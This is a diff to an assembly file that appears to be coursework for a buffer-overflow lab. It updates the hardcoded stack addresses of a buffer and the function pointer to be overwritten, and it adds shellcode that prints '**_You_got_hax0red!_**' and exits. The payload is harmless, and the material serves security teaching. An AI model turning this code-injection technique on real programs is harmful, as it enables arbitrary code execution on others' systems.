@@ -12,13 +12,31 @@
 BITS 64 ; We're writing 64-bit x86 code
 
 ; Some constants representing where the buffer and the function pointer are in memory -- these can be changed as needed
-%define buffer_ptr 0x7fffffffe2d0  ; this attack will be written to this buffer location
-%define func_ptr   0x7fffffffe3d0  ; this is the function pointer located after the normal buffer which we're going to overwrite
+
+%define buffer_ptr 0x7fffffffdff0  ; this attack will be written to this buffer location
+%define func_ptr   0x7fffffffe0f0  ; this is the function pointer located after the normal buffer which we're going to overwrite
 
 org buffer_ptr ; The org directive sets where the assembler *assumes* this code lives in memory. Normally you don't specify this in a normal assembly program, but here we need to know so that label references can work properly, since our code is loaded via *crime* rather than via the OS program loader.
 
 ; == BEGIN BUFFER; MACHINE CODE GOES HERE ==
 
+; order of operands: rax	rdi 	rsi 	rdx 	r10 	r8 	r9 	rax
+; mov al,-10
+; neg al
+; mov [newline], al
+
+; print the message.
+
+; set rax to syscall number 1 for `write`
+mov rax,1
+; set rdi to first param: fd 1 for stdout
+mov rdi,1
+; set rsi to second param: location of message?
+mov rsi,message
+; set rdx to length of message
+mov rdx,message_len
+; send it
+syscall
 
 ; Set rax to syscall number 60, exit. Unlike the in-class example, we don't have to worry
 ; about NULL bytes being in our attack code, as gets *only* stops at a newline.
@@ -32,11 +50,16 @@ mov rdi,5
 ; (see https://filippo.io/linux-syscall-table/ for syscall numbers (double-click a table row for parameters)
 syscall
 
+
 ; == END OF MACHINE CODE; START OF DATA EMBEDDED IN ATTACK BUFFER ==
 
 ; here's how we store a message in the attack buffer and note its length -- this attack doesn't make use of the message though
 ; note that there is no null terminator automatically included in NASM strings
 message db "**_You_got_hax0red!_**"
+; nl1 db 0xE2
+; nl2 db 0x80
+; nl3 db 0xA8
+; message2 db "You_done_goofed!!"
 ; you can use the macro message_len to get the length of the message in bytes
 message_len equ $-message
 
